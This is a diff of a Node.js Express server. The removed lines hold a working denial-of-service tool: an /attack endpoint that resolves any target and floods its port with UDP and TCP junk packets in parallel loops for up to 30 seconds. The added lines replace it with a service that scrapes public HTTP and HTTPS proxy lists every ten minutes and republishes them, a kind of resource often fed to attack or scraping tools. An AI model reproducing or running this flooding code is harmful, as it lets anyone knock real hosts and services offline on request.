@@ -1,79 +1,68 @@
-const http = require('http');
-const https = require('https');
-const dns = require('dns');
-const dgram = require('dgram');
-const net = require('net');
 const express = require('express');
+const fetch = require('node-fetch');
+const cron = require('node-cron');
 
 const app = express();
+const PORT = process.env.PORT || 80;
 
-function getIpFromUrl(url) {
-    return new Promise((resolve, reject) => {
-        dns.lookup(url, (err, address) => {
-            if (err) {
-                reject("Hostname could not be resolved.");
-            } else {
-                resolve(address);
-            }
-        });
-    });
+const httpProxyUrls = [
+    'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt',
+    'https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/http.txt',
+    'https://raw.githubusercontent.com/zloi-user/hideip.me/main/http.txt',
+    'https://raw.githubusercontent.com/ArrayIterator/proxy-lists/main/proxies/http.txt',
+    'https://yakumo.rei.my.id/HTTP',
+    'https://raw.githubusercontent.com/cybercrafttool/proxylist/results/all/http.proxy.txt',
+    'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt'
+];
+
+const httpsProxyUrls = [
+    'https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/https.txt',
+    'https://raw.githubusercontent.com/zloi-user/hideip.me/main/https.txt',
+    'https://raw.githubusercontent.com/ArrayIterator/proxy-lists/main/proxies/https.txt',
+    'https://raw.githubusercontent.com/cybercrafttool/proxylist/results/all/https.proxy.txt'
+];
+
+let httpProxies = [];
+let httpsProxies = [];
+
+async function fetchProxies(proxyUrls) {
+    let proxies = [];
+    for (let url of proxyUrls) {
+        try {
+            const response = await fetch(url);
+            const text = await response.text();
+            proxies.push(...text.split('\n').filter(Boolean));
+        } catch (error) {
+            console.error(`Error fetching proxies from ${url}:`, error);
+        }
+    }
+    return proxies;
 }
 
-function mixAttack(target, port, duration, threads) {
-    if (duration > 30) duration = 30;
-
-    const endTime = Date.now() + (duration * 1000);
-
-    const flood = () => {
-        while (Date.now() < endTime) {
-            try {
-                // UDP attack
-                const udpClient = dgram.createSocket('udp4');
-                const udpMessage = Buffer.from(Array(1028).fill('x'));
-                udpClient.send(udpMessage, port, target, (err) => {
-                    udpClient.close();
-                });
-
-                // TCP attack
-                const tcpClient = new net.Socket();
-                tcpClient.connect(port, target, () => {
-                    tcpClient.write(Buffer.from(Array(1000).fill('x')));
-                    tcpClient.end();
-                });
-            } catch (error) {
-                console.error(error);
-            }
-        }
-    };
-
-    for (let i = 0; i < threads; i++) {
-        setTimeout(flood, 0);
-    }
+async function updateProxies() {
+    httpProxies = await fetchProxies(httpProxyUrls);
+    httpsProxies = await fetchProxies(httpsProxyUrls);
+    console.log('Proxy lists updated');
 }
 
-app.get('/attack/:target/:port/:duration/:threads', async (req, res) => {
-    try {
-        const target = req.params.target;
-        const port = parseInt(req.params.port);
-        const duration = parseInt(req.params.duration);
-        const threads = parseInt(req.params.threads);
-
-        let ip = target;
-        if (target.startsWith('http://') || target.startsWith('https://')) {
-            ip = new URL(target).hostname;
-        }
-
-        if (!ip.match(/^\d{1,3}(\.\d{1,3}){3}$/)) {
-            ip = await getIpFromUrl(ip);
-        }
-
-        mixAttack(ip, port, duration, threads);
-        res.json({ status: "Attack sent", target: ip, method: "mix" });
-    } catch (error) {
-        res.status(500).json({ error: error.toString() });
-    }
+app.get('/http', (req, res) => {
+    res.set('Content-Type', 'text/plain');
+    res.send(httpProxies.join('\n'));
 });
 
-app.listen(6372, '0.0.0.0', () => {
-    console.log('Server is running on port 6372');
+app.get('/https', (req, res) => {
+    res.set('Content-Type', 'text/plain');
+    res.send(httpsProxies.join('\n'));
+});
+
+app.get('/all', (req, res) => {
+    res.set('Content-Type', 'text/plain');
+    const allProxies = [...httpProxies, ...httpsProxies];
+    res.send(allProxies.join('\n'));
+});
+
+app.listen(PORT, () => {
+    console.log(`Server is running on port ${PORT}`);
+    updateProxies(); // Initial fetch
+    cron.schedule('*/10 * * * *', updateProxies); // Fetch every 10 minutes
 });
